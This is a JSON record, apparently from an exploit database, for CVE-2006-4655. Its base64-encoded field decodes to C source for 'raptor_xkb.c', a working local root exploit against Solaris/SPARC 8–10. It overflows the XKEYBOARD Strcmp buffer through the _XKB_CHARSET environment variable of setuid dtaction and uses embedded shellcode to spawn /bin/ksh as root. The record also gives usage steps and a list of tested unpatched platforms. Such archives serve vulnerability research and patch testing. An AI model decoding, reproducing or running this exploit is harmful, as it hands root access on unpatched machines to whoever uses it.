{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqICRJZDogcmFwdG9yX3hrYi5jLHYgMS4xIDIwMDYvMDkvMTMgMTY6MTg6MzYgcmFwdG9yIEV4cCAkDQogKg0KICogcmFwdG9yX3hrYi5jIC0gWEtFWUJPQVJEIFN0cmNtcCgpLCBTb2xhcmlzL1NQQVJDIDgvOS8xMA0KICogQ29weXJpZ2h0IChjKSAyMDA2IE1hcmNvIEl2YWxkaSA8cmFwdG9yQDB4ZGVhZGJlZWYuaW5mbz4NCiAqDQogKiBCdWZmZXIgb3ZlcmZsb3cgaW4gdGhlIFN0cmNtcCBmdW5jdGlvbiBpbiB0aGUgWEtFWUJPQVJEIGV4dGVuc2lvbiBpbiBYIA0KICogV2luZG93IFN5c3RlbSBYMTFSNi40IGFuZCBlYXJsaWVyLCBhcyB1c2VkIGluIFNDTyBVbml4V2FyZSA3LjEuMyBhbmQgU3VuIA0KICogU29sYXJpcyA4IHRocm91Z2ggMTAsIGFsbG93cyBsb2NhbCB1c2VycyB0byBnYWluIHByaXZpbGVnZXMgdmlhIGEgbG9uZyANCiAqIF9YS0JfQ0hBUlNFVCBlbnZpcm9ubWVudCB2YXJpYWJsZSB2YWx1ZSAoQ1ZFLTIwMDYtNDY1NSkuDQogKg0KICogIllvdSBjZXJ0YWlubHkgZG8gc29tZSBuaW5qYSBzaGl0IG1hbi4iIC0tIEtldmluIEZpbmlzdGVycmUgKDBkZCkNCiAqDQogKiBFeHBsb2l0YXRpb24gb24gU29sYXJpcyA4LzkgcGxhdGZvcm1zIHdhcyB0cml2aWFsLCB3aGlsZSByZWNlbnQgU29sYXJpcyAxMCANCiAqIHJlcXVpcmVkIGFkZGl0aW9uYWwgZWZmb3J0czogZm9yIHNvbWUgb2JzY3VyZSByZWFzb24gdHJhZGl0aW9uYWwgcmV0dXJuIA0KICogaW50byB0aGUgc3RhY2sgZG9lc24ndCB3b3JrIChTSUdTRUdWIGR1ZSB0byBGTFRCT1VORFM/ISksIHNwcmludGYoKSBtdXN0IA0KICogYmUgdXNlZCBpbnN0ZWFkIG9mIHN0cmNweSgpIChzb21lIG5ldyBzZWN1cml0eSBtZWFzdXJlcyB3ZXJlIGFwcGFyZW50bHkNCiAqIGludHJvZHVjZWQgdG8gcHJldmVudCBleHBsb2l0YXRpb24pLCBhbmQgdGhlIGxkLnNvLjEgbWVtb3J5IHNwYWNlIGlzIGENCiAqIGJpdCBjaGFuZ2VkLiBJbiBvcmRlciBmb3IgdGhpcyBleHBsb2l0IHRvIHdvcmssIHRoZSBYIFdpbmRvdyBTeXN0ZW0gc2VydmVyIA0KICogRElTUExBWSBzcGVjaWZpZWQgYXMgYXJndW1lbnQgbXVzdCBoYXZlIHRoZSBYS0VZQk9BUkQgZXh0ZW5zaW9uIGVuYWJsZWQuDQogKg0KICogR3JlZXRzIHRvIEFkcmlhbm8gTGltYSA8YWRyaWFub0ByaXNlc2VjdXJpdHkub3JnPiBhbmQgRmlsaXBlIEJhbGVzdHJhDQogKiA8ZmlsaXBlX2JhbGVzdHJhQGhvdG1haWwuY29tPiwgd2hvIGRpc2NvdmVyZWQgdGhpcyB2dWxuZXJhYmlsaXR5LCBhbmQNCiAqIHRvIFJhbW9uIGRlIENhcnZhbGhvIFZhbGxlIDxyYW1vbkByaXNlc2VjdXJpdHkub3JnPiwgd2hvIGV4cGxvaXRlZCBpdC4NCiAqDQogKiBVc2FnZToNCiAqICQgZ2NjIHJhcHRvcl94a2IuYyAtbyByYXB0b3JfeGtiIC1sZGwgLVdhbGwNCiAqIFtvbiB5b3VyIHhzZXJ2ZXI6IGRpc2FibGUgdGhlIGFjY2VzcyBjb250cm9sXQ0KICogJCAuL3JhcHRvcl94a2IgMTkyLjE2OC4xLjE6MA0KICogIyBpZA0KICogdWlkPTAocm9vdCkgZ2lkPTEwKHN0YWZmKSBlZ2lkPTMoc3lzKQ0KICogIw0KICoNCiAqIFZ1bG5lcmFibGUgcGxhdGZvcm1zOg0KICogU29sYXJpcyA4IHdpdGhvdXQgcGF0Y2ggMTE5MDY3LTAzIFt0ZXN0ZWRdDQogKiBTb2xhcmlzIDkgd2l0aG91dCBwYXRjaCAxMTI3ODUtNTYgW3Rlc3RlZF0NCiAqIFNvbGFyaXMgMTAgd2l0aG91dCBwYXRjaCAxMTkwNTktMTYgW3Rlc3RlZF0NCiAqLw0KDQojaW5jbHVkZSA8ZGxmY24uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPGxpbmsuaD4NCiNpbmNsdWRlIDxwcm9jZnMuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZ3MuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzeXMvc3lzdGVtaW5mby5oPg0KDQojZGVmaW5lCUlORk8xCSJyYXB0b3JfeGtiLmMgLSBYS0VZQk9BUkQgU3RyY21wKCksIFNvbGFyaXMvU1BBUkMgOC85LzEwIg0KI2RlZmluZQlJTkZPMgkiQ29weXJpZ2h0IChjKSAyMDA2IE1hcmNvIEl2YWxkaSA8cmFwdG9yQDB4ZGVhZGJlZWYuaW5mbz4iDQoNCiNkZWZpbmUJVlVMTgkiL3Vzci9kdC9iaW4vZHRhY3Rpb24iCQkvLyBkZWZhdWx0IHNldHVpZCB0YXJnZXQNCi8vI2RlZmluZSBWVUxOCSIvdXNyL2R0L2Jpbi9kdHByaW50aW5mbyINCi8vI2RlZmluZSBWVUxOCSIvdXNyL2R0L2Jpbi9kdHNlc3Npb24iDQoNCiNkZWZpbmUJQlVGU0laRSAxMDI0CQkJCS8vIHNpemUgb2YgdGhlIGV2aWwgYnVmZmVyDQojZGVmaW5lCVZBUlNJWkUJMjA0OAkJCQkvLyBzaXplIG9mIHRoZSBldmlsIGVudiB2YXINCiNkZWZpbmUJRkZTSVpFCTY0ICsgMQkJCQkvLyBzaXplIG9mIHRoZSBmYWtlIGZyYW1lDQojZGVmaW5lCURVTU1ZCTB4ZGVhZGJlZWYJCQkvLyBkdW1teSBtZW1vcnkgYWRkcmVzcw0KDQovKiB2b29kb28gbWFjcm9zICovDQojZGVmaW5lCVZPT0RPTzMyKF8sX18sX19fKQl7Xy0tO18rPShfXytfX18tMSklNC1fJTQ8MD84LV8lNDo0LV8lNDt9DQojZGVmaW5lCVZPT0RPTzY0KF8sX18sX19fKQl7Xys9Ny0oXysoX18rX19fKzEpKjQrMyklODt9DQoNCmNoYXIgc2NbXSA9IC8qIFNvbGFyaXMvU1BBUkMgc2hlbGxjb2RlICgxMiArIDEyICsgNDggPSA3MiBieXRlcykgKi8NCi8qIGRvdWJsZSBzZXR1aWQoKSBpcyBuZWVkZWQgYnkgZHRwcmludGluZm8gYW5kIGR0c2Vzc2lvbiAqLw0KIlx4OTBceDA4XHgzZlx4ZmZceDgyXHgxMFx4MjBceDE3XHg5MVx4ZDBceDIwXHgwOCINCiJceDkwXHgwOFx4M2ZceGZmXHg4Mlx4MTBceDIwXHgxN1x4OTFceGQwXHgyMFx4MDgiDQovKiBleGVjdmUoKSAqLw0KIlx4MjBceGJmXHhmZlx4ZmZceDIwXHhiZlx4ZmZceGZmXHg3Zlx4ZmZceGZmXHhmZlx4OTBceDAzXHhlMFx4MjAiDQoiXHg5Mlx4MDJceDIwXHgxMFx4YzBceDIyXHgyMFx4MDhceGQwXHgyMlx4MjBceDEwXHhjMFx4MjJceDIwXHgxNCINCiJceDgyXHgxMFx4MjBceDBiXHg5MVx4ZDBceDIwXHgwOC9iaW4va3NoIjsNCg0KLyogZ2xvYmFscyAqLw0KY2hhcgkqZW52WzI1Nl07DQppbnQJZW52X3BvcyA9IDAsIGVudl9sZW4gPSAwOw0KDQovKiBwcm90b3R5cGVzICovDQppbnQJYWRkX2VudihjaGFyICpzdHJpbmcpOw0Kdm9pZAljaGVja196ZXJvKGludCBhZGRyLCBjaGFyICpwYXR0ZXJuKTsNCmludAlzZWFyY2hfbGRzbyhjaGFyICpzeW0pOw0KaW50CXNlYXJjaF9yd3hfbWVtKHZvaWQpOw0Kdm9pZAlzZXRfdmFsKGNoYXIgKmJ1ZiwgaW50IHBvcywgaW50IHZhbCk7DQoNCi8qDQogKiBtYWluKCkNCiAqLw0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQ0Kew0KCWNoYXIJYnVmW0JVRlNJWkVdLCB2YXJbVkFSU0laRV0sIGZmW0ZGU0laRV07DQoJY2hhcglwbGF0Zm9ybVsyNTZdLCByZWxlYXNlWzI1Nl0sIGRpc3BsYXlbMjU2XTsNCglpbnQJaSwgb2Zmc2V0LCBmZl9hZGRyLCBzY19hZGRyOw0KCWludAlwbGF0X2xlbiwgcHJvZ19sZW4sIHJlbDsNCg0KCWNoYXIJKmFyZ1syXSA9IHsiZm9vIiwgTlVMTH07DQoJaW50CWFyZ19sZW4gPSA0LCBhcmdfcG9zID0gMTsNCg0KCWludAlyZXQsIHJ3eF9tZW07DQoNCgkvKiBnZXQgdGhlIHN0YWNrIGJhc2UgKi8NCglpbnQJc2IgPSAoKGludClhcmd2WzBdIHwgMHhmZmZmKSAmIDB4ZmZmZmZmZmM7DQoNCgkvKiBwcmludCBleHBsb2l0IGluZm9ybWF0aW9uICovDQoJZnByaW50ZihzdGRlcnIsICIlc1xuJXNcblxuIiwgSU5GTzEsIElORk8yKTsNCg0KCS8qIHJlYWQgY29tbWFuZCBsaW5lICovDQoJaWYgKGFyZ2MgIT0gMikgew0KCQlmcHJpbnRmKHN0ZGVyciwgInVzYWdlOiAlcyB4c2VydmVyOmRpc3BsYXlcblxuIiwgYXJndlswXSk7DQoJCWV4aXQoMik7DQoJfQ0KCXNwcmludGYoZGlzcGxheSwgIkRJU1BMQVk9JXMiLCBhcmd2WzFdKTsNCg0KCS8qIGdldCBzb21lIHN5c3RlbSBpbmZvcm1hdGlvbiAqLw0KCXN5c2luZm8oU0lfUExBVEZPUk0sIHBsYXRmb3JtLCBzaXplb2YocGxhdGZvcm0pIC0gMSk7DQoJc3lzaW5mbyhTSV9SRUxFQVNFLCByZWxlYXNlLCBzaXplb2YocmVsZWFzZSkgLSAxKTsNCglyZWwgPSBhdG9pKHJlbGVhc2UgKyAyKTsNCg0KCS8qIGdldCB0aGUgYWRkcmVzcyBvZiBzdHJjcHkoKSBvciBzcHJpbnRmKCkgaW4gbGQuc28uMSAqLw0KCXJldCA9IChyZWwgPCAxMCA/IHNlYXJjaF9sZHNvKCJzdHJjcHkiKSA6IHNlYXJjaF9sZHNvKCJzcHJpbnRmIikpOw0KDQoJLyogZ2V0IHRoZSBhZGRyZXNzIG9mIFJXWCBtZW1vcnkgc2VnbWVudCBpbnNpZGUgbGQuc28uMSAqLw0KCXJ3eF9tZW0gPSBzZWFyY2hfcnd4X21lbSgpOw0KDQoJLyogcHJlcGFyZSB0aGUgZXZpbCBidWZmZXIgKi8NCgltZW1zZXQoYnVmLCAnQScsIHNpemVvZihidWYpKTsNCglidWZbc2l6ZW9mKGJ1ZikgLSAxXSA9IDB4MDsNCgltZW1jcHkoYnVmLCAiX1hLQl9DSEFSU0VUPSIsIDEzKTsNCg0KCS8qIHByZXBhcmUgdGhlIGV2aWwgZW52IHZhciAqLw0KCW1lbXNldCh2YXIsICdCJywgc2l6ZW9mKHZhcikpOw0KCXZhcltzaXplb2YodmFyKSAtIDFdID0gMHgwOw0KDQoJLyogcHJlcGFyZSB0aGUgZmFrZSBmcmFtZSAqLw0KCWJ6ZXJvKGZmLCBzaXplb2YoZmYpKTsNCg0KCS8qIA0KCSAqIHNhdmVkICVsIHJlZ2lzdGVycw0KCSAqLw0KCXNldF92YWwoZmYsIGkgID0gMCwgRFVNTVkpOwkJLyogJWwwICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCBEVU1NWSk7CQkvKiAlbDEgKi8NCglzZXRfdmFsKGZmLCBpICs9IDQsIERVTU1ZKTsJCS8qICVsMiAqLw0KCXNldF92YWwoZmYsIGkgKz0gNCwgRFVNTVkpOwkJLyogJWwzICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCBEVU1NWSk7CQkvKiAlbDQgKi8NCglzZXRfdmFsKGZmLCBpICs9IDQsIERVTU1ZKTsJCS8qICVsNSAqLw0KCXNldF92YWwoZmYsIGkgKz0gNCwgRFVNTVkpOwkJLyogJWw2ICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCBEVU1NWSk7CQkvKiAlbDcgKi8NCg0KCS8qDQoJICogc2F2ZWQgJWkgcmVnaXN0ZXJzDQoJICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCByd3hfbWVtKTsJCS8qICVpMDogMXN0IGFyZyB0byBmdW5jdGlvbiAqLw0KCXNldF92YWwoZmYsIGkgKz0gNCwgMHg0MjQyNDI0Mik7CS8qICVpMTogMm5kIGFyZyB0byBmdW5jdGlvbiAqLw0KCXNldF92YWwoZmYsIGkgKz0gNCwgRFVNTVkpOwkJLyogJWkyICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCBEVU1NWSk7CQkvKiAlaTMgKi8NCglzZXRfdmFsKGZmLCBpICs9IDQsIERVTU1ZKTsJCS8qICVpNCAqLw0KCXNldF92YWwoZmYsIGkgKz0gNCwgRFVNTVkpOwkJLyogJWk1ICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCBzYiAtIDEwMDApOwkJLyogJWk2OiBmcmFtZSBwb2ludGVyICovDQoJc2V0X3ZhbChmZiwgaSArPSA0LCByd3hfbWVtIC0gOCk7CS8qICVpNzogcmV0dXJuIGFkZHJlc3MgKi8NCg0KCS8qIGZpbGwgdGhlIGVudnAsIGtlZXBpbmcgcGFkZGluZyAqLw0KCXNjX2FkZHIgPSBhZGRfZW52KGZmKTsNCglhZGRfZW52KHNjKTsNCglhZGRfZW52KGRpc3BsYXkpOw0KCWFkZF9lbnYoYnVmKTsNCglhZGRfZW52KHZhcik7DQoJYWRkX2VudihOVUxMKTsNCg0KCS8qIGNhbGN1bGF0ZSB0aGUgb2Zmc2V0IHRvIGFyZ3ZbMF0gKHZvb2RvbyBtYWdpYykgKi8NCglwbGF0X2xlbiA9IHN0cmxlbihwbGF0Zm9ybSkgKyAxOw0KCXByb2dfbGVuID0gc3RybGVuKFZVTE4pICsgMTsNCglvZmZzZXQgPSBhcmdfbGVuICsgZW52X2xlbiArIHBsYXRfbGVuICsgcHJvZ19sZW47DQoJaWYgKHJlbCA+IDcpDQoJCVZPT0RPTzY0KG9mZnNldCwgYXJnX3BvcywgZW52X3BvcykNCgllbHNlDQoJCVZPT0RPTzMyKG9mZnNldCwgcGxhdF9sZW4sIHByb2dfbGVuKQ0KDQoJLyogY2FsY3VsYXRlIHRoZSBuZWVkZWQgYWRkcmVzc2VzICovDQoJZmZfYWRkciA9IHNiIC0gb2Zmc2V0ICsgYXJnX2xlbjsNCglzY19hZGRyICs9IGZmX2FkZHI7DQoNCgkvKiBzZXQgZmFrZSBmcmFtZSdzICVpMSAqLw0KCXNldF92YWwoZmYsIDM2LCBzY19hZGRyKTsJCS8qIDJuZCBhcmcgdG8gZnVuY3Rpb24gKi8NCg0KCS8qIGZpbGwgdGhlIGV2aWwgYnVmZmVyICovDQoJZm9yIChpID0gMTMgKyAyNTY7IGkgPCAxMyArIDI1NiArIDU2OyBpICs9IDQpIA0KCQlzZXRfdmFsKGJ1ZiwgaSwgc2IgLSAyMDQ4KTsNCgkvKiB3ZSBkb24ndCBuZWVkIHRvIGJydXRlZm9yY2UgKi8NCglzZXRfdmFsKGJ1ZiwgMTMgKyAyNTYgKyA1NiwgZmZfYWRkcik7CS8qIGZha2UgZnJhbWUgYWRkcmVzcyAqLw0KCXNldF92YWwoYnVmLCAxMyArIDI1NiArIDYwLCByZXQgLSA0KTsJLyogZnVuY3Rpb24sIGFmdGVyIHRoZSBzYXZlICovDQoNCgkvKiBmaWxsIHRoZSBldmlsIGVudiB2YXIgKi8NCglmb3IgKGkgPSAwOyBpIDwgVkFSU0laRSAtIDg7IGkgKz0gNCkNCgkJc2V0X3ZhbCh2YXIsIGksIHNiIC0gMjA0OCk7DQoNCgkvKiBwcmludCBzb21lIG91dHB1dCAqLw0KCWZwcmludGYoc3RkZXJyLCAiVXNpbmcgU0lfUExBVEZPUk1cdDogJXMgKCVzKVxuIiwgcGxhdGZvcm0sIHJlbGVhc2UpOw0KCWZwcmludGYoc3RkZXJyLCAiVXNpbmcgc3RhY2sgYmFzZVx0OiAweCVwXG4iLCAodm9pZCAqKXNiKTsNCglmcHJpbnRmKHN0ZGVyciwgIlVzaW5nIHJ3eF9tZW0gYWRkcmVzc1x0OiAweCVwXG4iLCAodm9pZCAqKXJ3eF9tZW0pOw0KCWZwcmludGYoc3RkZXJyLCAiVXNpbmcgc2MgYWRkcmVzc1x0OiAweCVwXG4iLCAodm9pZCAqKXNjX2FkZHIpOw0KCWZwcmludGYoc3RkZXJyLCAiVXNpbmcgZmYgYWRkcmVzc1x0OiAweCVwXG4iLCAodm9pZCAqKWZmX2FkZHIpOw0KCWZwcmludGYoc3RkZXJyLCAiVXNpbmcgZnVuY3Rpb24gYWRkcmVzc1x0OiAweCVwXG5cbiIsICh2b2lkICopcmV0KTsNCg0KCS8qIHJ1biB0aGUgdnVsbmVyYWJsZSBwcm9ncmFtICovDQoJZXhlY3ZlKFZVTE4sIGFyZywgZW52KTsNCglwZXJyb3IoImV4ZWN2ZSIpOw0KCWV4aXQoMCk7DQp9DQoNCi8qDQogKiBhZGRfZW52KCk6IGFkZCBhIHZhcmlhYmxlIHRvIGVudnAgYW5kIHBhZCBpZiBuZWVkZWQNCiAqLw0KaW50IGFkZF9lbnYoY2hhciAqc3RyaW5nKQ0Kew0KCWludAlpOw0KDQoJLyogbnVsbCB0ZXJtaW5hdGlvbiAqLw0KCWlmICghc3RyaW5nKSB7DQoJCWVudltlbnZfcG9zXSA9IE5VTEw7DQoJCXJldHVybihlbnZfbGVuKTsNCgl9DQoNCgkvKiBhZGQgdGhlIHZhcmlhYmxlIHRvIGVudnAgKi8NCgllbnZbZW52X3Bvc10gPSBzdHJpbmc7DQoJZW52X2xlbiArPSBzdHJsZW4oc3RyaW5nKSArIDE7DQoJZW52X3BvcysrOw0KDQoJLyogcGFkIHRoZSBlbnZwIHVzaW5nIHplcm9lcyAqLw0KCWlmICgoc3RybGVuKHN0cmluZykgKyAxKSAlIDQpDQoJCWZvciAoaSA9IDA7IGkgPCAoNCAtICgoc3RybGVuKHN0cmluZykrMSklNCkpOyBpKyssIGVudl9wb3MrKykgew0KCQkJZW52W2Vudl9wb3NdID0gc3RyaW5nICsgc3RybGVuKHN0cmluZyk7DQoJCQllbnZfbGVuKys7DQoJCX0NCg0KCXJldHVybihlbnZfbGVuKTsNCn0NCg0KLyoNCiAqIGNoZWNrX3plcm8oKTogY2hlY2sgYW4gYWRkcmVzcyBmb3IgdGhlIHByZXNlbmNlIG9mIGEgMHgwMA0KICovDQp2b2lkIGNoZWNrX3plcm8oaW50IGFkZHIsIGNoYXIgKnBhdHRlcm4pDQp7DQoJaWYgKCEoYWRkciAmIDB4ZmYpIHx8ICEoYWRkciAmIDB4ZmYwMCkgfHwgIShhZGRyICYgMHhmZjAwMDApIHx8DQoJICAgICEoYWRkciAmIDB4ZmYwMDAwMDApKSB7DQoJCWZwcmludGYoc3RkZXJyLCAiRXJyb3I6ICVzIGNvbnRhaW5zIGEgMHgwMCFcbiIsIHBhdHRlcm4pOw0KCQlleGl0KDEpOw0KCX0NCn0NCg0KLyoNCiAqIHNlYXJjaF9sZHNvKCk6IHNlYXJjaCBmb3IgYSBzeW1ib2wgaW5zaWRlIGxkLnNvLjENCiAqLw0KaW50IHNlYXJjaF9sZHNvKGNoYXIgKnN5bSkNCnsNCglpbnQJCWFkZHI7DQoJdm9pZAkJKmhhbmRsZTsNCglMaW5rX21hcAkqbG07DQoNCgkvKiBvcGVuIHRoZSBleGVjdXRhYmxlIG9iamVjdCBmaWxlICovDQoJaWYgKChoYW5kbGUgPSBkbG1vcGVuKExNX0lEX0xEU08sIE5VTEwsIFJUTERfTEFaWSkpID09IE5VTEwpIHsNCgkJcGVycm9yKCJkbG9wZW4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCgkvKiBnZXQgZHluYW1pYyBsb2FkIGluZm9ybWF0aW9uICovDQoJaWYgKChkbGluZm8oaGFuZGxlLCBSVExEX0RJX0xJTktNQVAsICZsbSkpID09IC0xKSB7DQoJCXBlcnJvcigiZGxpbmZvIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJLyogc2VhcmNoIGZvciB0aGUgYWRkcmVzcyBvZiB0aGUgc3ltYm9sICovDQoJaWYgKChhZGRyID0gKGludClkbHN5bShoYW5kbGUsIHN5bSkpID09IE5VTEwpIHsNCgkJZnByaW50ZihzdGRlcnIsICJzb3JyeSwgZnVuY3Rpb24gJXMoKSBub3QgZm91bmRcbiIsIHN5bSk7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJLyogY2xvc2UgdGhlIGV4ZWN1dGFibGUgb2JqZWN0IGZpbGUgKi8NCglkbGNsb3NlKGhhbmRsZSk7DQoNCgljaGVja196ZXJvKGFkZHIgLSA0LCBzeW0pOw0KCWNoZWNrX3plcm8oYWRkciAtIDgsIHN5bSk7IC8qIGFkZHIgLSA4IGlzIHRoZSByZXQgYmVmb3JlIGZ1bmN0aW9uICovDQoJcmV0dXJuKGFkZHIpOw0KfQ0KDQovKg0KICogc2VhcmNoX3J3eF9tZW0oKTogc2VhcmNoIGZvciBhbiBSV1ggbWVtb3J5IHNlZ21lbnQgdmFsaWQgZm9yIGFsbA0KICogcHJvZ3JhbXMgKHR5cGljYWxseSwgL3Vzci9saWIvbGQuc28uMSkgdXNpbmcgdGhlIHByb2MgZmlsZXN5c3RlbQ0KICovDQppbnQgc2VhcmNoX3J3eF9tZW0odm9pZCkNCnsNCglpbnQJZmQ7DQoJY2hhcgl0bXBbMTZdOw0KCXBybWFwX3QJbWFwOw0KCWludAlhZGRyID0gMDsNCg0KCS8qIG9wZW4gdGhlIHByb2MgZmlsZXN5c3RlbSAqLw0KCXNwcmludGYodG1wLCIvcHJvYy8lZC9tYXAiLCAoaW50KWdldHBpZCgpKTsNCglpZiAoKGZkID0gb3Blbih0bXAsIE9fUkRPTkxZKSkgPCAwKSB7DQoJCWZwcmludGYoc3RkZXJyLCAiY2FuJ3Qgb3BlbiAlc1xuIiwgdG1wKTsNCgkJZXhpdCgxKTsNCgl9DQoNCgkvKiBzZWFyY2ggZm9yIHRoZSBsYXN0IFJXWCBtZW1vcnkgc2VnbWVudCBiZWZvcmUgc3RhY2sgKi8NCgl3aGlsZSAocmVhZChmZCwgJm1hcCwgc2l6ZW9mKG1hcCkpKQ0KCQlpZiAobWFwLnByX21mbGFncyA9PSAoTUFfUkVBRCB8IE1BX1dSSVRFIHwgTUFfRVhFQykpDQoJCQlhZGRyID0gbWFwLnByX3ZhZGRyOw0KCWNsb3NlKGZkKTsNCg0KCS8qIGFkZCA0IHRvIHRoZSBleGFjdCBhZGRyZXNzIE5VTEwgYnl0ZXMgKi8NCglpZiAoIShhZGRyICYgMHhmZikpDQoJCWFkZHIgfD0gMHgwNDsNCglpZiAoIShhZGRyICYgMHhmZjAwKSkNCgkJYWRkciB8PSAweDA0MDA7DQoNCglyZXR1cm4oYWRkcik7DQp9DQoNCi8qDQogKiBzZXRfdmFsKCk6IGNvcHkgYSBkd29yZCBpbnNpZGUgYSBidWZmZXINCiAqLw0Kdm9pZCBzZXRfdmFsKGNoYXIgKmJ1ZiwgaW50IHBvcywgaW50IHZhbCkNCnsNCglidWZbcG9zXSA9CSh2YWwgJiAweGZmMDAwMDAwKSA+PiAyNDsNCglidWZbcG9zICsgMV0gPQkodmFsICYgMHgwMGZmMDAwMCkgPj4gMTY7DQoJYnVmW3BvcyArIDJdID0JKHZhbCAmIDB4MDAwMGZmMDApID4+IDg7DQoJYnVmW3BvcyArIDNdID0JKHZhbCAmIDB4MDAwMDAwZmYpOw0KfQ0KDQovLyBtaWx3MHJtLmNvbSBbMjAwNi0wOS0xM10=", 
    "filename": "platforms/solaris/local/2360.c", 
    "id": "2360", 
    "cves": [
        "CVE-2006-4655"
    ]
}